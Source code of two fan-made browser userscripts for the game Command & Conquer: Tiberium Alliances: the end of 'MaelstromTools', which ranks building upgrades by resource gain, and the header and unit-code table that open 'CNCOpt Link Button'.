              this.HT_ShowOnlyTopBuildings[eType].setMargin(5); 
              this.HT_ShowOnlyTopBuildings[eType].setValue(MaelstromTools.LocalStorage.get("UGL_TOPBUILDINGS_" + eType, true)); 
              this.HT_ShowOnlyTopBuildings[eType].addListener("execute", this.CBChanged, this); 
              oOptions.add(this.HT_ShowOnlyTopBuildings[eType], { 
                left: 10, 
                top: 10 
              }); 
              this.HT_ShowOnlyAffordableBuildings[eType] = new qx.ui.form.CheckBox(Lang.gt("display only affordable buildings")); 
              this.HT_ShowOnlyAffordableBuildings[eType].setMargin(5); 
              this.HT_ShowOnlyAffordableBuildings[eType].setValue(MaelstromTools.LocalStorage.get("UGL_AFFORDABLE_" + eType, true)); 
              this.HT_ShowOnlyAffordableBuildings[eType].addListener("execute", this.CBChanged, this); 
              oOptions.add(this.HT_ShowOnlyAffordableBuildings[eType], { 
                left: 10, 
                top: 10, 
                lineBreak: true 
              }); 
              this.HT_CityBuildings[eType] = new Array(); 
              for (var cname in MT_Cache.Cities) { 
                var oCity = MT_Cache.Cities[cname].Object; 
                var oCityBuildings = new HuffyTools.CityCheckBox(cname); 
                oCityBuildings.HT_CityID = oCity.get_Id(); 
                oCityBuildings.setMargin(5); 
                oCityBuildings.setValue(MaelstromTools.LocalStorage.get("UGL_CITYFILTER_" + eType + "_" + oCity.get_Id(), true)); 
                oCityBuildings.addListener("execute", this.CBChanged, this); 
                oOptions.add(oCityBuildings, { 
                  left: 10, 
                  top: 10 
                }); 
                this.HT_CityBuildings[eType][cname] = oCityBuildings; 
              } 
              this.HT_Options[eType] = oOptions; 
            }, 
            createTable: function (eType) { 
              try { 
                this.HT_Models[eType] = new qx.ui.table.model.Simple(); 
                this.HT_Models[eType].setColumns(["ID", Lang.gt("City"), Lang.gt("Type (coord)"), Lang.gt("to Level"), Lang.gt("Gain/h"), Lang.gt("Factor"), Lang.gt("Tiberium"), Lang.gt("Power"), Lang.gt("Tib/gain"), Lang.gt("Pow/gain"), Lang.gt("ETA"), Lang.gt("Upgrade"), "State"]); 
                this.HT_Tables[eType] = new qx.ui.table.Table(this.HT_Models[eType]); 
                this.HT_Tables[eType].setColumnVisibilityButtonVisible(false); 
                this.HT_Tables[eType].setColumnWidth(0, 0); 
                this.HT_Tables[eType].setColumnWidth(1, 90); 
                this.HT_Tables[eType].setColumnWidth(2, 120); 
                this.HT_Tables[eType].setColumnWidth(3, 55); 
                this.HT_Tables[eType].setColumnWidth(4, 70); 
                this.HT_Tables[eType].setColumnWidth(5, 60); 
                this.HT_Tables[eType].setColumnWidth(6, 70); 
                this.HT_Tables[eType].setColumnWidth(7, 70); 
                this.HT_Tables[eType].setColumnWidth(8, 70); 
                this.HT_Tables[eType].setColumnWidth(9, 70); 
                this.HT_Tables[eType].setColumnWidth(10, 70); 
                this.HT_Tables[eType].setColumnWidth(11, 40); 
                this.HT_Tables[eType].setColumnWidth(12, 0); 
                var tcm = this.HT_Tables[eType].getTableColumnModel(); 
                tcm.setColumnVisible(0, false); 
                tcm.setColumnVisible(12, false); 
                tcm.setDataCellRenderer(4, new qx.ui.table.cellrenderer.Number().set({ 
                  numberFormat: new qx.util.format.NumberFormat().set({ 
                    maximumFractionDigits: 2, 
                    minimumFractionDigits: 2 
                  }) 
                })); 
                tcm.setDataCellRenderer(5, new qx.ui.table.cellrenderer.Number().set({ 
                  numberFormat: new qx.util.format.NumberFormat().set({ 
                    maximumFractionDigits: 5, 
                    minimumFractionDigits: 5 
                  }) 
                })); 
                tcm.setDataCellRenderer(6, new HuffyTools.ReplaceRender().set({ 
                  ReplaceFunction: this.formatTiberiumAndPower 
                })); 
                tcm.setDataCellRenderer(7, new HuffyTools.ReplaceRender().set({ 
                  ReplaceFunction: this.formatTiberiumAndPower 
                })); 
                tcm.setDataCellRenderer(11, new HuffyTools.ImageRender(40, 20)); 
              } catch (e) { 
                console.log("HuffyTools.UpgradePriority.createTable: ", e); 
              } 
            }, 
            createTabPage: function (resource_type) { 
              try { 
                var sName = MaelstromTools.Statics.LootTypeName(resource_type); 
                var oRes = new qx.ui.tabview.Page(Lang.gt(sName), MT_Base.images[sName]); 
                oRes.setLayout(new qx.ui.layout.VBox(2)); 
                oRes.setPadding(5); 
                var btnTab = oRes.getChildControl("button"); 
                btnTab.resetWidth(); 
                btnTab.resetHeight(); 
                btnTab.set({ 
                  show: "icon", 
                  margin: 0, 
                  padding: 0, 
                  toolTipText: sName 
                }); 
                btnTab.addListener("execute", this.TabChanged, [this, resource_type]); 
                this.HT_Pages[resource_type] = oRes; 
                return oRes; 
              } catch (e) { 
                console.log("HuffyTools.UpgradePriority.createTabPage: ", e); 
              } 
            }, 
 
            TabChanged: function (e) { 
              try { 
                this[0].HT_SelectedResourceType = this[1]; 
                this[0].UpgradeCompleted(null, null); 
              } catch (e) { 
                console.log("HuffyTools.UpgradePriority.TabChanged: ", e); 
              } 
            }, 
 
            upgradeBuilding: function (e, eResourceType) { 
              if (this.upgradeInProgress == true) { 
                console.log("upgradeBuilding:", "upgrade in progress !"); 
                return; 
              } 
              try { 
                if (e.getColumn() == 11) { 
                  var buildingID = this.HT_Models[eResourceType].getValue(0, e.getRow()); 
                  var iState = parseInt(this.HT_Models[eResourceType].getValue(12, e.getRow())); 
                  if (iState != 1) { 
                    return; 
                  } 
                  if (buildingID in this.BuildingList) { 
                    this.upgradeInProgress = true; 
                    if (PerforceChangelist >= 382917) { //new 
                      ClientLib.Net.CommunicationManager.GetInstance().SendCommand("UpgradeBuilding", this.BuildingList[buildingID], phe.cnc.Util.createEventDelegate(ClientLib.Net.CommandResult, this, this.UpgradeCompleted), null, true); 
                    } else { //old 
                      ClientLib.Net.CommunicationManager.GetInstance().SendCommand("UpgradeBuilding", this.BuildingList[buildingID], webfrontend.Util.createEventDelegate(ClientLib.Net.CommandResult, this, this.UpgradeCompleted), null, true); 
                    } 
                  } 
                } 
              } catch (e) { 
                console.log("HuffyTools.UpgradePriority.upgradeBuilding: ", e); 
              } 
            }, 
            UpgradeCompleted: function (context, result) { 
              var self = this; 
              window.setTimeout(function () { 
                self.calc(); 
              }, 1000); 
              this.upgradeInProgress = false; 
            }, 
            CBChanged: function (e) { 
              this.UpgradeCompleted(null, null); 
            }, 
            formatTiberiumAndPower: function (oValue) { 
              if (PerforceChangelist >= 387751) { //new 
                return phe.cnc.gui.util.Numbers.formatNumbersCompact(oValue); 
              } else { //old 
                return webfrontend.gui.Util.formatNumbersCompact(oValue); 
              } 
            }, 
            updateCache: function () { 
              try { 
                if (!this.HT_TabView) { 
                  this.init(); 
                } 
                var eType = this.HT_SelectedResourceType; 
                var bTop = this.HT_ShowOnlyTopBuildings[eType].getValue(); 
                MaelstromTools.LocalStorage.set("UGL_TOPBUILDINGS_" + eType, bTop); 
                var bAffordable = this.HT_ShowOnlyAffordableBuildings[eType].getValue(); 
                MaelstromTools.LocalStorage.set("UGL_AFFORDABLE_" + eType, bAffordable); 
                var oCityFilter = new Array(); 
                for (var cname in this.HT_CityBuildings[eType]) { 
                  var oCityBuildings = this.HT_CityBuildings[eType][cname]; 
                  var bFilterBuilding = oCityBuildings.getValue(); 
                  MaelstromTools.LocalStorage.set("UGL_CITYFILTER_" + eType + "_" + oCityBuildings.HT_CityID, bFilterBuilding); 
                  oCityFilter[cname] = bFilterBuilding; 
                } 
                window.HuffyTools.UpgradePriority.getInstance().collectData(bTop, bAffordable, oCityFilter, eType); 
              } catch (e) { 
                console.log("HuffyTools.UpgradePriority.updateCache: ", e); 
              } 
            }, 
            setWidgetLabels: function () { 
              try { 
                var HuffyCalc = window.HuffyTools.UpgradePriority.getInstance(); 
                var UpgradeList = HuffyCalc.Cache; 
 
                for (var eResourceType in UpgradeList) { 
                  //var eResourceType = MaelstromTools.Statics.LootTypeName(eResourceName); 
                  var rowData = []; 
 
                  this.HT_Models[eResourceType].setData([]); 
 
                  for (var mCity in UpgradeList[eResourceType]) { 
                    for (var mBuilding in UpgradeList[eResourceType][mCity]) { 
                      var UpItem = UpgradeList[eResourceType][mCity][mBuilding]; 
                      if (typeof (UpItem.Type) == "undefined") { 
                        continue; 
                      } 
                      if (!(mBuilding in this.BuildingList)) { 
                        this.BuildingList[UpItem.ID] = UpItem.Building; 
                      } 
                      var iTiberiumCosts = 0; 
                      if (ClientLib.Base.EResourceType.Tiberium in UpItem.Costs) { 
                        iTiberiumCosts = UpItem.Costs[ClientLib.Base.EResourceType.Tiberium]; 
                      } 
                      var iTiberiumPerGain = 0; 
                      if (ClientLib.Base.EResourceType.Tiberium in UpItem.Costs) { 
                        iTiberiumPerGain = UpItem.Costs[ClientLib.Base.EResourceType.Tiberium] / UpItem.GainPerHour; 
                      } 
                      var iPowerCosts = 0; 
                      if (ClientLib.Base.EResourceType.Power in UpItem.Costs) { 
                        iPowerCosts = UpItem.Costs[ClientLib.Base.EResourceType.Power]; 
                      } 
                      var iPowerPerGain = 0; 
                      if (ClientLib.Base.EResourceType.Power in UpItem.Costs) { 
                        iPowerPerGain = UpItem.Costs[ClientLib.Base.EResourceType.Power] / UpItem.GainPerHour; 
                      } 
                      var img = MT_Base.images["UpgradeBuilding"]; 
                      if (UpItem.Affordable == false) { 
                        img = ""; 
                      } 
                      var sType = UpItem.Type; 
                      sType = sType + "(" + UpItem.PosX + ":" + UpItem.PosY + ")"; 
                      var iETA = 0; 
                      if (UpItem.TimeTillUpgradable[ClientLib.Base.EResourceType.Tiberium] > 0) { 
                        iETA = UpItem.TimeTillUpgradable[ClientLib.Base.EResourceType.Tiberium]; 
                      } 
                      if (UpItem.TimeTillUpgradable[ClientLib.Base.EResourceType.Power] > iETA) { 
                        iETA = UpItem.TimeTillUpgradable[ClientLib.Base.EResourceType.Power]; 
                      } 
                      var sETA = ""; 
                      if (iETA > 0) { 
                        sETA = ClientLib.Vis.VisMain.FormatTimespan(iETA); 
                      } 
                      var iState = 0; 
                      if (UpItem.Affordable == true) { 
                        iState = 1; 
                      } else if (UpItem.AffordableByTransfer == true) { 
                        iState = 2; 
                      } else { 
                        iState = 3; 
                      } 
                      rowData.push([UpItem.ID, mCity, sType, UpItem.Level, UpItem.GainPerHour, UpItem.Ticks, iTiberiumCosts, iPowerCosts, iTiberiumPerGain, iPowerPerGain, sETA, img, iState]); 
                    } 
                  } 
                  this.HT_Models[eResourceType].setData(rowData); 
                } 
              } catch (e) { 
                console.log("HuffyTools.UpgradePriority.setWidgetLabels: ", e); 
              } 
            } 
          } 
        }); 
 
        // define HuffyTools.UpgradePriority 
        qx.Class.define("HuffyTools.UpgradePriority", { 
          type: "singleton", 
          extend: qx.core.Object, 
          members: { 
            list_units: null, 
            list_buildings: null, 
 
            comparePrio: function (elem1, elem2) { 
              if (elem1.Ticks < elem2.Ticks) return -1; 
              if (elem1.Ticks > elem2.Ticks) return 1; 
              return 0; 
            }, 
            getPrioList: function (city, arTechtypes, eModPackageSize, eModProduction, bOnlyTopBuildings, bOnlyAffordableBuildings) { 
              try { 
                var RSI = window.MaelstromTools.ResourceOverview.getInstance(); 
                RSI.updateCache(); 
                var TotalTiberium = 0; 
 
                for (var cityName in this.Cache) { 
                  var cityCache = this.Cache[cityName]; 
                  var i = cityCache[MaelstromTools.Statics.Tiberium]; 
                  if (typeof (i) !== 'undefined') { 
                    TotalTiberium += i; 
                    //but never goes here during test.... // to optimize - to do 
                  } 
                } 
                var resAll = new Array(); 
                var prod = MaelstromTools.Production.getInstance().updateCache(city.get_Name()); 
                //var buildings = MaelstromTools.Wrapper.GetBuildings(city.get_CityBuildingsData()); 
                var buildings = city.get_Buildings().d; 
 
                // 376877 & old fixes  
                var objbuildings = []; 
                if (PerforceChangelist >= 376877) { //new 
                  for (var o in buildings) objbuildings.push(buildings[o]); 
                } else { //old 
                  for (var i = 0; i < buildings.length; i++) objbuildings.push(buildings[i]); 
                } 
 
 
                for (var i = 0; i < objbuildings.length; i++) { 
                  var city_building = objbuildings[i]; 
 
                  // TODO: check for destroyed building 
 
                  var iTechType = city_building.get_TechName(); 
                  var bSkip = true; 
                  for (var iTypeKey in arTechtypes) { 
                    if (arTechtypes[iTypeKey] == iTechType) { 
                      bSkip = false; 
                      break; 
                    } 
                  } 
                  if (bSkip == true) { 
                    continue; 
                  } 
                  var city_buildingdetailview = city.GetBuildingDetailViewInfo(city_building); 
                  if (city_buildingdetailview == null) { 
                    continue; 
                  } 
                  var bindex = city_building.get_Id(); 
                  var resbuilding = new Array(); 
                  resbuilding["ID"] = bindex; 
                  resbuilding["Type"] = this.TechTypeName(parseInt(iTechType, 10)); 
                  resbuilding["PosX"] = city_building.get_CoordX(); 
                  resbuilding["PosY"] = city_building.get_CoordY(); 
 
                  resbuilding["Building"] = { 
                    cityid: city.get_Id(), 
                    posX: resbuilding["PosX"], 
                    posY: resbuilding["PosY"], 
                    isPaid: true 
                  }; 
 
                  resbuilding["GainPerHour"] = 0; 
                  resbuilding["Level"] = city_building.get_CurrentLevel() + 1; 
                  for (var ModifierType in city_buildingdetailview.OwnProdModifiers.d) { 
                    switch (parseInt(ModifierType, 10)) { 
                      case eModPackageSize: 
                        { 
                          var ModOj = city_buildingdetailview.OwnProdModifiers.d[city_building.get_MainModifierTypeId()]; 
                          var Mod = (ModOj.TotalValue + ModOj.NewLvlDelta) / ClientLib.Data.MainData.GetInstance().get_Time().get_StepsPerHour(); 
                          resbuilding["GainPerHour"] += (city_buildingdetailview.OwnProdModifiers.d[ModifierType].NewLvlDelta / Mod); 
                          break; 
                        } 
                      case eModProduction: 
                        { 
                          resbuilding["GainPerHour"] += city_buildingdetailview.OwnProdModifiers.d[ModifierType].NewLvlDelta; 
                          break; 
                        } 
                    } 
                  } 
                  // Nutzen ins VerhÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¤ltnis zu den Kosten setzten 
                  var TechLevelData = ClientLib.Base.Util.GetTechLevelResourceRequirements_Obj(city_building.get_CurrentLevel() + 1, city_building.get_TechGameData_Obj()); 
                  var RatioPerCostType = new Object(); 
                  var sRatio = ""; 
                  var sCosts = ""; 
                  var lTicks = 0; 
                  var bHasPower = true; 
                  var bHasTiberium = true; 
                  var bAffordableByTransfer = true; 
                  var oCosts = new Array(); 
                  var oTimes = new Array(); 
                  for (var costtype in TechLevelData) { 
                    if (typeof (TechLevelData[costtype]) == "function") { 
                      continue; 
                    } 
                    if (TechLevelData[costtype].Type == "0") { 
                      continue; 
                    } 
 
                    oCosts[TechLevelData[costtype].Type] = TechLevelData[costtype].Count; 
                    if (parseInt(TechLevelData[costtype].Count) <= 0) { 
                      continue; 
                    } 
                    RatioPerCostType[costtype] = TechLevelData[costtype].Count / resbuilding["GainPerHour"]; 
                    if (sCosts.length > 0) { 
                      sCosts = sCosts + ", "; 
                    } 
                    sCosts = sCosts + MaelstromTools.Wrapper.FormatNumbersCompact(TechLevelData[costtype].Count) + " " + MaelstromTools.Statics.LootTypeName(TechLevelData[costtype].Type); 
                    if (sRatio.length > 0) { 
                      sRatio = sRatio + ", "; 
                    } 
                    // Upgrade affordable ? 
                    if (city.GetResourceCount(TechLevelData[costtype].Type) < TechLevelData[costtype].Count) { 
                      switch (TechLevelData[costtype].Type) { 
                        case ClientLib.Base.EResourceType.Tiberium: 
                          { 
                            bHasTiberium = false; 
                            if (TotalTiberium < TechLevelData[costtype].Count) { 
                              bAffordableByTransfer = false; 
                            } 
                          } 
                          break; 
                        case ClientLib.Base.EResourceType.Power: 
                          { 
                            bHasPower = false; 
                          } 
                          break; 
                      } 
                    } 
                    sRatio = sRatio + MaelstromTools.Wrapper.FormatNumbersCompact(RatioPerCostType[costtype]); 
 
                    var techlevelData = MaelstromTools.Statics.LootTypeName(TechLevelData[costtype].Type); 
 
                    var dCityProduction = prod[techlevelData].Delta + prod[techlevelData].ExtraBonusDelta + prod[techlevelData].POI; 
                    if (dCityProduction > 0) { 
                      if (lTicks < (3600 * RatioPerCostType[costtype] / dCityProduction)) { 
                        lTicks = (3600 * RatioPerCostType[costtype] / dCityProduction); 
                      } 
                    } 
                    oTimes[TechLevelData[costtype].Type] = 0; 
                    if (oCosts[TechLevelData[costtype].Type] > city.GetResourceCount(TechLevelData[costtype].Type)) { 
                      oTimes[TechLevelData[costtype].Type] = (3600 * (oCosts[TechLevelData[costtype].Type] - city.GetResourceCount(TechLevelData[costtype].Type))) / dCityProduction; 
                    } 
                  } 
                  resbuilding["Ticks"] = lTicks; 
                  resbuilding["Time"] = ClientLib.Vis.VisMain.FormatTimespan(lTicks); 
                  resbuilding["Costtext"] = sCosts; 
                  resbuilding["Costs"] = oCosts; 
                  resbuilding["TimeTillUpgradable"] = oTimes; 
                  resbuilding["Ratio"] = sRatio; 
                  resbuilding["Affordable"] = bHasTiberium && bHasPower; 
                  resbuilding["AffordableByTransfer"] = bHasPower && bAffordableByTransfer; 
                  if (resbuilding["GainPerHour"] > 0 && (bOnlyAffordableBuildings == false || resbuilding["Affordable"] == true)) { 
                    resAll[bindex] = resbuilding; 
                  } 
                } 
 
 
                resAll = resAll.sort(this.comparePrio); 
                if (!bOnlyTopBuildings) { 
                  return resAll; 
                } 
                var res2 = new Array(); 
                if (MaelstromTools.Util.ArraySize(resAll) > 0) { 
                  var iTopNotAffordable = -1; 
                  var iTopAffordable = -1; 
                  var iNextNotAffordable = -1; 
                  var iLastIndex = -1; 
                  for (var iNewIndex in resAll) { 
                    if (resAll[iNewIndex].Affordable == true) { 
                      if (iTopAffordable == -1) { 
                        iTopAffordable = iNewIndex; 
                        iNextNotAffordable = iLastIndex; 
                      } 
                    } else { 
                      if (iTopNotAffordable == -1) { 
                        iTopNotAffordable = iNewIndex; 
                      } 
                    } 
                    iLastIndex = iNewIndex; 
                  } 
                  if (iTopAffordable == -1) { 
                    iNextNotAffordable = iLastIndex; 
                  } 
                  var iIndex = 0; 
                  if (iTopNotAffordable != -1) { 
                    res2[iIndex++] = resAll[iTopNotAffordable]; 
                  } 
                  if (iNextNotAffordable != -1) { 
                    res2[iIndex++] = resAll[iNextNotAffordable]; 
                  } 
                  if (iTopAffordable != -1) { 
                    res2[iIndex++] = resAll[iTopAffordable]; 
                  } 
                } 
                res2 = res2.sort(this.comparePrio); 
                return res2; 
              } catch (e) { 
                console.log("HuffyTools.getPrioList: ", e); 
              } 
            }, 
            TechTypeName: function (iTechType) { 
              switch (iTechType) { 
                case ClientLib.Base.ETechName.PowerPlant: 
                  { 
                    return Lang.gt("Powerplant"); 
                    break; 
                  } 
                case ClientLib.Base.ETechName.Refinery: 
                  { 
                    return Lang.gt("Refinery"); 
                    break; 
                  } 
                case ClientLib.Base.ETechName.Harvester_Crystal: 
                  { 
                    return Lang.gt("Harvester"); 
                    break; 
                  } 
                case ClientLib.Base.ETechName.Harvester: 
                  { 
                    return Lang.gt("Harvester"); 
                    break; 
                  } 
                case ClientLib.Base.ETechName.Silo: 
                  { 
                    return Lang.gt("Silo"); 
                    break; 
                  } 
                case ClientLib.Base.ETechName.Accumulator: 
                  { 
                    return Lang.gt("Accumulator"); 
                    break; 
                  } 
              } 
              return "?"; 
            }, 
            collectData: function (bOnlyTopBuildings, bOnlyAffordableBuildings, oCityFilter, eSelectedResourceType) { 
              try { 
                MT_Cache.updateCityCache(); 
                this.Cache = new Object(); 
                if (eSelectedResourceType == ClientLib.Base.EResourceType.Tiberium) { 
                  this.Cache[ClientLib.Base.EResourceType.Tiberium] = new Object(); 
                } 
                if (eSelectedResourceType == ClientLib.Base.EResourceType.Crystal) { 
                  this.Cache[ClientLib.Base.EResourceType.Crystal] = new Object(); 
                } 
                if (eSelectedResourceType == ClientLib.Base.EResourceType.Power) { 
                  this.Cache[ClientLib.Base.EResourceType.Power] = new Object(); 
                } 
                if (eSelectedResourceType == ClientLib.Base.EResourceType.Gold) { 
                  this.Cache[ClientLib.Base.EResourceType.Gold] = new Object(); 
                } 
                for (var cname in MT_Cache.Cities) { 
                  var city = MT_Cache.Cities[cname].Object; 
                  if (oCityFilter[cname] == false) { 
                    continue; 
                  } 
                  if (eSelectedResourceType == ClientLib.Base.EResourceType.Tiberium) { 
                    this.Cache[ClientLib.Base.EResourceType.Tiberium][cname] = this.getPrioList(city, [ClientLib.Base.ETechName.Harvester, ClientLib.Base.ETechName.Silo], ClientLib.Base.EModifierType.TiberiumPackageSize, ClientLib.Base.EModifierType.TiberiumProduction, bOnlyTopBuildings, bOnlyAffordableBuildings); 
                  } 
                  if (eSelectedResourceType == ClientLib.Base.EResourceType.Crystal) { 
                    this.Cache[ClientLib.Base.EResourceType.Crystal][cname] = this.getPrioList(city, [ClientLib.Base.ETechName.Harvester, ClientLib.Base.ETechName.Silo], ClientLib.Base.EModifierType.CrystalPackageSize, ClientLib.Base.EModifierType.CrystalProduction, bOnlyTopBuildings, bOnlyAffordableBuildings); 
                  } 
                  if (eSelectedResourceType == ClientLib.Base.EResourceType.Power) { 
                    this.Cache[ClientLib.Base.EResourceType.Power][cname] = this.getPrioList(city, [ClientLib.Base.ETechName.PowerPlant, ClientLib.Base.ETechName.Accumulator], ClientLib.Base.EModifierType.PowerPackageSize, ClientLib.Base.EModifierType.PowerProduction, bOnlyTopBuildings, bOnlyAffordableBuildings); 
                  } 
                  if (eSelectedResourceType == ClientLib.Base.EResourceType.Gold) { 
                    this.Cache[ClientLib.Base.EResourceType.Gold][cname] = this.getPrioList(city, [ClientLib.Base.ETechName.Refinery, ClientLib.Base.ETechName.PowerPlant], ClientLib.Base.EModifierType.CreditsPackageSize, ClientLib.Base.EModifierType.CreditsProduction, bOnlyTopBuildings, bOnlyAffordableBuildings); 
                  } 
                } 
              } catch (e) { 
                console.log("HuffyTools.UpgradePriority.collectData: ", e); 
              } 
            } 
          } 
        }); 
 
        var __MTCity_initialized = false; //k undeclared 
 
        var Lang = window.MaelstromTools.Language.getInstance(); 
        var MT_Cache = window.MaelstromTools.Cache.getInstance(); 
        var MT_Base = window.MaelstromTools.Base.getInstance(); 
        var MT_Preferences = window.MaelstromTools.Preferences.getInstance(); 
        MT_Preferences.readOptions(); 
 
        if (!webfrontend.gui.region.RegionCityMenu.prototype.__MTCity_showMenu) { 
          webfrontend.gui.region.RegionCityMenu.prototype.__MTCity_showMenu = webfrontend.gui.region.RegionCityMenu.prototype.showMenu; 
        } 
        webfrontend.gui.region.RegionCityMenu.prototype.showMenu = function (selectedVisObject) { 
 
          MT_Cache.SelectedBaseForMenu = selectedVisObject; 
          var baseStatusOverview = window.MaelstromTools.BaseStatus.getInstance(); 
 
          if (__MTCity_initialized == false) { 
            //console.log(selectedBase.get_Name()); 
            __MTCity_initialized = true; 
            baseStatusOverview.CityMenuButtons = new Array(); 
 
            for (var k in this) { 
              try { 
                if (this.hasOwnProperty(k)) { 
                  if (this[k] && this[k].basename == "Composite") { 
                    var button = new qx.ui.form.Button(Lang.gt("Calibrate support")); 
                    button.addListener("execute", function (e) { 
                      MaelstromTools.Util.calibrateWholeSupportOnSelectedBase(); 
                    }, this); 
 
                    this[k].add(button); 
                    baseStatusOverview.CityMenuButtons.push(button); 
                  } 
                } 
              } catch (e) { 
                console.log("webfrontend.gui.region.RegionCityMenu.prototype.showMenu: ", e); 
              } 
            } 
          } 
 
          var isAllowed = MaelstromTools.Util.checkIfSupportIsAllowed(MT_Cache.SelectedBaseForMenu); 
 
          for (var x = 0; x < baseStatusOverview.CityMenuButtons.length; ++x) { 
            baseStatusOverview.CityMenuButtons[x].setVisibility(isAllowed ? 'visible' : 'excluded'); 
          } 
          this.__MTCity_showMenu(selectedVisObject); 
        }; 
 
        if (MT_Preferences.Settings.showLoot) { 
          // Wrap onCitiesChange method 
          if (!webfrontend.gui.region.RegionNPCCampStatusInfo.prototype.__MTCity_NPCCamp) { 
            webfrontend.gui.region.RegionNPCCampStatusInfo.prototype.__MTCity_NPCCamp = webfrontend.gui.region.RegionNPCCampStatusInfo.prototype.onCitiesChange; 
          } 
          webfrontend.gui.region.RegionNPCCampStatusInfo.prototype.onCitiesChange = function () { 
            MT_Base.updateLoot(1, ClientLib.Vis.VisMain.GetInstance().get_SelectedObject(), webfrontend.gui.region.RegionNPCCampStatusInfo.getInstance()); 
            return this.__MTCity_NPCCamp(); 
          }; 
 
          if (!webfrontend.gui.region.RegionNPCBaseStatusInfo.prototype.__MTCity_NPCBase) { 
            webfrontend.gui.region.RegionNPCBaseStatusInfo.prototype.__MTCity_NPCBase = webfrontend.gui.region.RegionNPCBaseStatusInfo.prototype.onCitiesChange; 
          } 
          webfrontend.gui.region.RegionNPCBaseStatusInfo.prototype.onCitiesChange = function () { 
            MT_Base.updateLoot(2, ClientLib.Vis.VisMain.GetInstance().get_SelectedObject(), webfrontend.gui.region.RegionNPCBaseStatusInfo.getInstance()); 
            //MT_Base.updateLoot(2, ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity(), webfrontend.gui.region.RegionNPCBaseStatusInfo.getInstance()); 
            return this.__MTCity_NPCBase(); 
          }; 
 
          if (!webfrontend.gui.region.RegionCityStatusInfoEnemy.prototype.__MTCity_City) { 
            webfrontend.gui.region.RegionCityStatusInfoEnemy.prototype.__MTCity_City = webfrontend.gui.region.RegionCityStatusInfoEnemy.prototype.onCitiesChange; 
          } 
          webfrontend.gui.region.RegionCityStatusInfoEnemy.prototype.onCitiesChange = function () { 
            MT_Base.updateLoot(3, ClientLib.Vis.VisMain.GetInstance().get_SelectedObject(), webfrontend.gui.region.RegionCityStatusInfoEnemy.getInstance()); 
            //MT_Base.updateLoot(3, ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCity(), webfrontend.gui.region.RegionCityStatusInfoEnemy.getInstance()); 
            return this.__MTCity_City(); 
          }; 
        } 
 
      } 
    } catch (e) { 
      console.log("createMaelstromTools: ", e); 
    } 
 
    function MaelstromTools_checkIfLoaded() { 
      try { 
        if (typeof qx != 'undefined' && qx.core.Init.getApplication() && qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_NAVIGATION) && qx.core.Init.getApplication().getUIItem(ClientLib.Data.Missions.PATH.BAR_NAVIGATION).isVisible()) { 
          createMaelstromTools(); 
          window.MaelstromTools.Base.getInstance().initialize(); 
        } else { 
          window.setTimeout(MaelstromTools_checkIfLoaded, 1000); 
        } 
      } catch (e) { 
        console.log("MaelstromTools_checkIfLoaded: ", e); 
      } 
    } 
 
    if (/commandandconquer\.com/i.test(document.domain)) { 
      window.setTimeout(MaelstromTools_checkIfLoaded, 1000); 
    } 
  }; 
 
  try { 
    var MaelstromScript = document.createElement("script"); 
    MaelstromScript.innerHTML = "(" + MaelstromTools_main.toString() + ")();"; 
    MaelstromScript.type = "text/javascript"; 
    if (/commandandconquer\.com/i.test(document.domain)) { 
      document.getElementsByTagName("head")[0].appendChild(MaelstromScript); 
    } 
  } catch (e) { 
    console.log("MaelstromTools: init error: ", e); 
  } 
})();





// ==UserScript==
// @version       1.7.5
// @updateURL     https://userscripts.org/scripts/source/131289.meta.js
// @downloadURL   https://userscripts.org/scripts/source/131289.user.js
// @name          C&C:TA CNCOpt Link Button
// @namespace     http://cncopt.com/
// @icon          http://cncopt.com/favicon.ico
// @description   Creates a "CNCOpt" button when selecting a base in Command & Conquer: Tiberium Alliances. The share button takes you to http://cncopt.com/ and fills in the selected base information so you can analyze or share the base.
// @include       http*://prodgame*.alliances.commandandconquer.com/*/index.aspx*
// @include       http*://*.cncopt.com/*
// @include       http*://cncopt.com/*
// @grant         GM_log
// @grant         GM_setValue
// @grant         GM_getValue
// @grant         GM_registerMenuCommand
// @grant         GM_xmlhttpRequest
// @grant         GM_updatingEnabled
// @grant         unsafeWindow
// @contributor   PythEch (http://http://userscripts.org/users/220246)
// @contributor   jerbri (http://userscripts.org/users/507954)
// ==/UserScript==
/* 

2013-03-03: Special thanks to jerbri for fixing this up so it worked again!
2012-11-25: Special thanks to PythEch for fixing this up so it worked again!

*/
var scity = null;
var tcity = null;
var tbase = null;
try {
  unsafeWindow.__cncopt_version = "1.7.5";
  (function () {
    var cncopt_main = function () {

      var defense_unit_map = {
        /* GDI Defense Units */"GDI_Wall": "w",
        "GDI_Cannon": "c",
        "GDI_Antitank Barrier": "t",
        "GDI_Barbwire": "b",
        "GDI_Turret": "m",
        "GDI_Flak": "f",
        "GDI_Art Inf": "r",
        "GDI_Art Air": "e",
        "GDI_Art Tank": "a",
        "GDI_Def_APC Guardian": "g",
        "GDI_Def_Missile Squad": "q",
        "GDI_Def_Pitbull": "p",
        "GDI_Def_Predator": "d",
        "GDI_Def_Sniper": "s",
        "GDI_Def_Zone Trooper": "z",
        /* Nod Defense Units */"NOD_Def_Antitank Barrier": "t",
        "NOD_Def_Art Air": "e",
        "NOD_Def_Art Inf": "r",
        "NOD_Def_Art Tank": "a",
        "NOD_Def_Attack Bike": "p",
        "NOD_Def_Barbwire": "b",
        "NOD_Def_Black Hand": "z",
        "NOD_Def_Cannon": "c",
        "NOD_Def_Confessor": "s",
        "NOD_Def_Flak": "f",
        "NOD_Def_MG Nest": "m",
        "NOD_Def_Militant Rocket Soldiers": "q",
        "NOD_Def_Reckoner": "g",
        "NOD_Def_Scorpion Tank": "d",
        "NOD_Def_Wall": "w",

        /* Forgotten Defense Units */"FOR_Wall": "w",
        "FOR_Barbwire_VS_Inf": "b",
        "FOR_Barrier_VS_Veh": "t",
        "FOR_Inf_VS_Inf": "g",
        "FOR_Inf_VS_Veh": "r",
        "FOR_Inf_VS_Air": "q",
        "FOR_Sniper": "n",
        "FOR_Mammoth": "y",
        "FOR_Veh_VS_Inf": "o",
        "FOR_Veh_VS_Veh": "s",
        "FOR_Veh_VS_Air": "u",
        "FOR_Turret_VS_Inf": "m",
        "FOR_Turret_VS_Inf_ranged": "a",
        "FOR_Turret_VS_Veh": "v",
